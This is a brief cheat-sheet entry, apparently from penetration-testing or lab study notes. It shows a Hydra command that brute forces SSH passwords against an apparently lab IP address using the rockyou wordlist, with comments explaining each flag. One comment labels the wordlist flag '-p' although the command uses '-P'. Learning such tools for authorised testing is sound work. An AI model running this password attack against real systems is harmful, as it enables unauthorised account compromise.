Hydra is a brute forcing tool

## SSH

Example:
``` bash
hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.193.166 ssh
# -t for threads 
# -l for the username to use
# -p for the word list path
#-vV for Verbosity

#After that is the ip of the attacked box and then the method you are trying to brute force
```
